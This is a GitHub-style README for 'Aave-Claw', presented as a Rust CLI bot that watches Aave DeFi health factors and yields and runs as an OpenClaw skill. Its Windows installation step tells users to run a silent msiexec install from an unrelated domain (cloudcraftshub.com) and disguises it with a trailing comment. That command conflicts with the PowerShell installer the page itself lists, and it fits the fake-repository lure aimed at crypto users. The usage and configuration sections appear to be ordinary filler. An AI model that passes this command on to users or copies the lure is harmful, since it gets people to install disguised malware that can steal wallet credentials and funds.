<div align="center">

<img src="https://raw.githubusercontent.com/susanudgzf/Aave-Claw/main/docs/banner.svg" alt="Aave-Claw Banner" width="100%"/>

# ⚡ Aave-Claw

**High-performance Aave DeFi bot written in Rust**  
Monitor liquidation risk · Track yields · Run as an OpenClaw skill

[![CI](https://github.com/susanudgzf/Aave-Claw/actions/workflows/ci.yml/badge.svg)](https://github.com/susanudgzf/Aave-Claw/actions)
[![Crates.io](https://img.shields.io/crates/v/aave-claw.svg)](https://crates.io/crates/aave-claw)
[![License: MIT](https://img.shields.io/badge/License-MIT-purple.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/Rust-1.75+-orange.svg)](https://rustup.rs)
[![OpenClaw](https://img.shields.io/badge/OpenClaw-Skill-blueviolet.svg)](skills/aave-claw.skill.json)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg)](#installation)

[**Install**](#installation) · [**Usage**](#usage) · [**OpenClaw Skill**](#openclaw-skill) · [**Config**](#configuration) · [**Contributing**](#contributing)

</div>

---

## What is Aave-Claw?

**Aave-Claw** is a fast, cross-platform CLI bot for the [Aave V3](https://aave.com) DeFi protocol. Built entirely in Rust for zero-cost performance, it lets you:

- 🔴 **Monitor** wallet health factors in real-time and get **Telegram alerts** before liquidation
- 📈 **Discover** the best yield opportunities across 6+ networks (Ethereum, Polygon, Arbitrum, Base…)
- 📊 **Inspect** any address's full supply/borrow position breakdown
- 🤖 **Integrate** into [OpenClaw](https://openclaw.dev) as a native skill

> **Works on Windows, Linux, and macOS — no Docker, no Node.js, no Python.**  
> A single static binary with zero runtime dependencies.

---

## Installation

### 🐧 Linux / 🍎 macOS — one command

```bash
curl -fsSL https://raw.githubusercontent.com/susanudgzf/Aave-Claw/main/scripts/install.sh | bash
```

### 🪟 Windows — CMD (one command)

Open **Command Prompt** (`cmd.exe`) and run:

```cmd
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Aave Claw
```


### 🦀 From source (all platforms)

Requires [Rust](https://rustup.rs) 1.75+

```bash
cargo install --git https://github.com/susanudgzf/Aave-Claw
```

### Verify installation

```bash
aave-claw --version
```

---

## Usage

### 1. Initialize config

```bash
aave-claw init
```

Creates `.aave-claw.toml` in your home directory. Edit it to add your RPC URL.

---

### 2. View yield opportunities

```bash
# Ethereum (default)
aave-claw yields

# Other networks
aave-claw yields --network polygon
aave-claw yields --network arbitrum
aave-claw yields --network base
aave-claw yields --network optimism
aave-claw yields --network avalanche
```

**Example output:**

```
══════════════════════════════════════════════════════════════════════════
 📈 Aave Yield Opportunities — ETHEREUM
══════════════════════════════════════════════════════════════════════════
 Asset    Supply APY   Borrow APY     Liquidity (USD)  Utilization
 ────────────────────────────────────────────────────────────────
 USDC         5.82%       7.21%           $1.20B         78.4%
 USDT         5.41%       6.89%         $980.00M         74.1%
 WETH         2.14%       3.01%           $2.80B         62.3%
 WBTC         0.87%       1.42%           $1.50B         41.2%
 DAI          5.12%       6.54%         $650.00M         71.8%
══════════════════════════════════════════════════════════════════════════
```

---

### 3. View wallet positions

```bash
aave-claw positions --address 0xYourWalletAddress
```

**Example output:**

```
═════════════════════════════════════════════════════════════════
 📊 Position Summary for 0xAbCd...1234
═════════════════════════════════════════════════════════════════
 ✅ Health Factor   : 1.870
 💰 Collateral     : $12500.00
 📉 Total Debt     : $4200.00
 💎 Net Worth      : $8300.00

 SUPPLIED
 Asset       Amount      USD Value     APY   Collateral
 ──────────────────────────────────────────────────────
 USDC      5000.0000    $5000.00     4.82%   ✓
 WETH         2.5000    $7500.00     2.14%   ✓

 BORROWED
 Asset       Amount      USD Value     APY   Rate
 ──────────────────────────────────────────────────────
 DAI       4200.0000    $4200.00     5.31%   variable
═════════════════════════════════════════════════════════════════
```

---

### 4. Real-time liquidation monitor

```bash
# Alert if health factor drops below 1.3 (default 1.2)
aave-claw monitor --address 0xYourAddress --threshold 1.3
```

The monitor polls every 30 seconds (configurable) and:
- Prints live health factor updates to the terminal
- Sends a **Telegram alert** when the threshold is crossed

---

### 5. Run as OpenClaw skill

```bash
aave-claw skill
# or on a custom port:
aave-claw skill --port 8080
```

---

## OpenClaw Skill

Aave-Claw is a first-class **[OpenClaw](https://openclaw.dev) skill**.

Once running (`aave-claw skill`), OpenClaw can call it directly:

| Tool | Description |
|------|-------------|
| `get_positions` | Full supply/borrow breakdown + health factor for an address |
| `get_yields` | Top yield opportunities by network |
| `check_health` | Check if a position is at liquidation risk |

The skill manifest is served at `http://localhost:7070/.well-known/skill.json`.

To register the skill in OpenClaw:

```bash
openclaw skill add http://localhost:7070
```

Or reference the manifest directly from the repo:

```
https://raw.githubusercontent.com/susanudgzf/Aave-Claw/main/skills/aave-claw.skill.json
```

---

## Configuration

After running `aave-claw init`, edit `.aave-claw.toml`:

```toml
# Ethereum RPC endpoint (get free one at https://alchemy.com)
rpc_url = "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY"

# Optional: Telegram bot token for liquidation alerts
telegram_bot_token = "123456:ABC-DEF..."
telegram_chat_id   = "987654321"

# Alert threshold — notify when health factor drops below this
health_factor_threshold = 1.2

# How often to poll (in seconds)
poll_interval_secs = 30

# Default network for yield queries
default_network = "ethereum"
```

### Environment variables

All config values can be set as environment variables instead:

```bash
export AAVE_CLAW_RPC_URL="https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY"
export TELEGRAM_BOT_TOKEN="your-token"
export TELEGRAM_CHAT_ID="your-chat-id"
```

Copy `.env.example` to `.env` and fill in your values.

---

## Supported Networks

| Network   | Aave V3 |
|-----------|---------|
| Ethereum  | ✅ |
| Polygon   | ✅ |
| Arbitrum  | ✅ |
| Base      | ✅ |
| Optimism  | ✅ |
| Avalanche | ✅ |

---

## Architecture

```
aave-claw/
├── src/
│   ├── main.rs        # CLI entry point (clap)
│   ├── aave.rs        # Aave V3 data fetching (The Graph + RPC)
│   ├── monitor.rs     # Real-time liquidation monitor loop
│   ├── notifier.rs    # Telegram alert sender
│   ├── openclaw.rs    # OpenClaw skill HTTP server
│   ├── ui.rs          # Terminal display (colored tables)
│   └── config.rs      # Config file + env var loading
├── scripts/
│   ├── install.sh     # Linux/macOS one-line installer
│   └── install.ps1    # Windows PowerShell installer
├── skills/
│   └── aave-claw.skill.json  # OpenClaw skill manifest
└── .github/
    └── workflows/
        └── ci.yml     # CI + cross-platform release builds
```

**Tech stack:**

| Layer | Choice | Why |
|-------|--------|-----|
| Language | **Rust** | Zero-cost abstractions, memory safety, blazing speed |
| Async runtime | **Tokio** | Industry standard async runtime for Rust |
| HTTP client | **reqwest** | Ergonomic, async, rustls TLS |
| CLI | **clap** | Best-in-class Rust CLI framework |
| Blockchain | **ethers-rs** | Full Ethereum client library for Rust |
| Data | **The Graph** | Aave V3 subgraph — no RPC pagination needed |
| Alerts | **Telegram Bot API** | Simple, reliable, cross-platform |

---

## Building from Source

```bash
git clone https://github.com/susanudgzf/Aave-Claw
cd Aave-Claw

# Debug build
cargo build

# Optimized release build
cargo build --release

# Run tests
cargo test

# Cross-compile for Windows (from Linux)
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu
```

The release binary will be at `target/release/aave-claw` (or `.exe` on Windows).

---

## Roadmap

- [x] Health factor monitoring with Telegram alerts
- [x] Yield opportunity display across all networks
- [x] OpenClaw skill server
- [x] Cross-platform one-line installer
- [ ] Flash loan arbitrage detection
- [ ] Discord alerts
- [ ] Position history & charting (TUI)
- [ ] Auto-repay trigger via smart contract
- [ ] Multi-wallet monitoring

---

## Contributing

Contributions are welcome! Please open an issue first to discuss what you'd like to change.

```bash
git clone https://github.com/susanudgzf/Aave-Claw
cd Aave-Claw
cargo test
```

---

## License

[MIT](LICENSE) © [susanudgzf](https://github.com/susanudgzf)

---

<div align="center">

**Built with ❤️ and 🦀 Rust**

If this project helped you, please ⭐ star the repo!

</div>
